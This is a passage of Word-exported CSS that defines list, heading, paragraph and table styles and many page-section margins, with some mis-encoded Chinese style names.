mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

p.MsoNormal{
mso-style-name:ÕýÎÄ;
mso-style-parent:"";
mso-style-next:ÒýÎÄÄ¿Â¼;
margin-top:0.0000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:0.0000pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
font-family:Georgia;
font-size:11.0000pt;
}

h1{
mso-style-name:"±êÌâ 1";
mso-style-next:ÕýÎÄ;
margin-top:4.4000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:8.0000pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
mso-outline-level:2;
font-family:Arial;
font-weight:bold;
font-size:24.5000pt;
}

h2{
mso-style-name:"±êÌâ 2";
mso-style-next:ÕýÎÄ;
margin-top:0.0000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:8.0000pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
mso-outline-level:3;
font-family:Arial;
font-weight:bold;
font-size:19.5000pt;
}

h3{
mso-style-name:"±êÌâ 3";
mso-style-next:ÕýÎÄ;
margin-top:7.7000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:8.0000pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
mso-outline-level:4;
font-family:Georgia;
font-weight:bold;
font-size:15.0000pt;
}

h4{
mso-style-name:"±êÌâ 4";
mso-style-next:ÕýÎÄ;
margin-top:14.9000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:8.0000pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
mso-outline-level:5;
font-family:Arial;
font-weight:bold;
font-style:italic;
font-size:15.0000pt;
}

span.10{
font-family:Calibri;
}

p.MsoBodyText{
mso-style-name:ÕýÎÄÎÄ±¾;
margin-top:0.0000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:8.0000pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
font-family:Georgia;
font-size:15.0000pt;
}

p.MsoToa{
mso-style-name:ÒýÎÄÄ¿Â¼;
mso-style-next:ÕýÎÄ;
margin-top:0.0000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:21.0000pt;
mso-para-margin-left:2.0000gd;
text-autospace:none;
mso-pagination:none;
text-align:left;
font-family:Georgia;
font-size:11.0000pt;
}

p.17{
mso-style-name:"List Paragraph";
margin-top:0.0000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:30.5000pt;
text-indent:-20.2500pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
font-family:Georgia;
font-size:11.0000pt;
}

p.18{
mso-style-name:"Table Paragraph";
margin-top:0.0000pt;
margin-right:0.0000pt;
margin-bottom:0.0000pt;
margin-left:2.4500pt;
text-autospace:none;
mso-pagination:none;
text-align:left;
font-family:'Courier New';
font-size:11.0000pt;
}

span.msoIns{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:underline;
text-underline:single;
color:blue;
}

span.msoDel{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:line-through;
color:red;
}

table.MsoNormalTable{
mso-style-name:ÆÕÍ¨±í¸ñ;
mso-style-parent:"";
mso-style-noshow:yes;
mso-tstyle-rowband-size:0;
mso-tstyle-colband-size:0;
mso-padding-alt:0.0000pt 5.4000pt 0.0000pt 5.4000pt;
mso-para-margin:0pt;
mso-para-margin-bottom:.0001pt;
mso-pagination:widow-orphan;
font-family:'Times New Roman';
font-size:10.0000pt;
mso-ansi-language:#0400;
mso-fareast-language:#0400;
mso-bidi-language:#0400;
}

table.19{
mso-style-name:"Table Normal";
mso-tstyle-rowband-size:0;
mso-tstyle-colband-size:0;
mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt;
mso-para-margin:0pt;
mso-para-margin-bottom:.0001pt;
mso-pagination:widow-orphan;
font-family:'Times New Roman';
font-size:10.0000pt;
mso-ansi-language:#0400;
mso-fareast-language:#0400;
mso-bidi-language:#0400;
}
@page{mso-page-border-surround-header:no;
	mso-page-border-surround-footer:no;}@page Section0{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section0{page:Section0;}@page Section1{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section1{page:Section1;}@page Section2{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section2{page:Section2;}@page Section3{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section3{page:Section3;}@page Section4{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section4{page:Section4;}@page Section5{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section5{page:Section5;}@page Section6{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section6{page:Section6;}@page Section7{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section7{page:Section7;}@page Section8{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section8{page:Section8;}@page Section9{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section9{page:Section9;}@page Section10{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section10{page:Section10;}@page Section11{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section11{page:Section11;}@page Section12{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section12{page:Section12;}@page Section13{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section13{page:Section13;}@page Section14{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section14{page:Section14;}@page Section15{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section15{page:Section15;}@page Section16{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section16{page:Section16;}@page Section17{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section17{page:Section17;}@page Section18{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section18{page:Section18;}@page Section19{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section19{page:Section19;}@page Section20{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section20{page:Section20;}@page Section21{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section21{page:Section21;}@page Section22{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section22{page:Section22;}@page Section23{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section23{page:Section23;}@page Section24{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section24{page:Section24;}@page Section25{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section25{page:Section25;}@page Section26{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section26{page:Section26;}@page Section27{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section27{page:Section27;}@page Section28{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section28{page:Section28;}@page Section29{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section29{page:Section29;}@page Section30{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section30{page:Section30;}@page Section31{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section31{page:Section31;}@page Section32{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section32{page:Section32;}@page Section33{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section33{page:Section33;}@page Section34{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section34{page:Section34;}@page Section35{
margin-top:67.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section35{page:Section35;}@page Section36{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section36{page:Section36;}@page Section37{
margin-top:74.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section37{page:Section37;}@page Section38{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section38{page:Section38;}@page Section39{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section39{page:Section39;}@page Section40{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section40{page:Section40;}@page Section41{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section41{page:Section41;}@page Section42{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section42{page:Section42;}@page Section43{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section43{page:Section43;}@page Section44{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section44{page:Section44;}@page Section45{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section45{page:Section45;}@page Section46{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section46{page:Section46;}@page Section47{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section47{page:Section47;}@page Section48{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section48{page:Section48;}@page Section49{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section49{page:Section49;}@page Section50{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section50{page:Section50;}@page Section51{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section51{page:Section51;}@page Section52{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section52{page:Section52;}@page Section53{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section53{page:Section53;}@page Section54{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section54{page:Section54;}@page Section55{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section55{page:Section55;}@page Section56{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section56{page:Section56;}@page Section57{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section57{page:Section57;}@page Section58{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section58{page:Section58;}@page Section59{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section59{page:Section59;}@page Section60{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section60{page:Section60;}@page Section61{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section61{page:Section61;}@page Section62{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section62{page:Section62;}@page Section63{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section63{page:Section63;}@page Section64{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section64{page:Section64;}@page Section65{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section65{page:Section65;}@page Section66{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section66{page:Section66;}@page Section67{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section67{page:Section67;}@page Section68{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section68{page:Section68;}@page Section69{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section69{page:Section69;}@page Section70{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section70{page:Section70;}@page Section71{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section71{page:Section71;}@page Section72{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section72{page:Section72;}@page Section73{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section73{page:Section73;}@page Section74{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section74{page:Section74;}@page Section75{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section75{page:Section75;}@page Section76{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section76{page:Section76;}@page Section77{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section77{page:Section77;}@page Section78{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section78{page:Section78;}@page Section79{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section79{page:Section79;}@page Section80{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section80{page:Section80;}@page Section81{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section81{page:Section81;}@page Section82{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section82{page:Section82;}@page Section83{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section83{page:Section83;}@page Section84{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section84{page:Section84;}@page Section85{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section85{page:Section85;}@page Section86{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section86{page:Section86;}@page Section87{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section87{page:Section87;}@page Section88{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section88{page:Section88;}@page Section89{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section89{page:Section89;}@page Section90{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section90{page:Section90;}@page Section91{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section91{page:Section91;}@page Section92{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section92{page:Section92;}@page Section93{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section93{page:Section93;}@page Section94{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section94{page:Section94;}@page Section95{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section95{page:Section95;}@page Section96{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section96{page:Section96;}@page Section97{
margin-top:67.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section97{page:Section97;}@page Section98{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section98{page:Section98;}@page Section99{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section99{page:Section99;}@page Section100{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section100{page:Section100;}@page Section101{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section101{page:Section101;}@page Section102{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section102{page:Section102;}@page Section103{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section103{page:Section103;}@page Section104{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section104{page:Section104;}@page Section105{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section105{page:Section105;}@page Section106{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section106{page:Section106;}@page Section107{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section107{page:Section107;}@page Section108{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section108{page:Section108;}@page Section109{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section109{page:Section109;}@page Section110{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section110{page:Section110;}@page Section111{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section111{page:Section111;}@page Section112{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section112{page:Section112;}@page Section113{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section113{page:Section113;}@page Section114{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section114{page:Section114;}@page Section115{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section115{page:Section115;}@page Section116{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section116{page:Section116;}@page Section117{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section117{page:Section117;}@page Section118{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section118{page:Section118;}@page Section119{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section119{page:Section119;}@page Section120{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section120{page:Section120;}@page Section121{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section121{page:Section121;}@page Section122{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section122{page:Section122;}@page Section123{
margin-top:67.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section123{page:Section123;}@page Section124{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section124{page:Section124;}@page Section125{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section125{page:Section125;}@page Section126{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section126{page:Section126;}@page Section127{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section127{page:Section127;}@page Section128{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section128{page:Section128;}@page Section129{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section129{page:Section129;}@page Section130{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section130{page:Section130;}@page Section131{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section131{page:Section131;}@page Section132{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
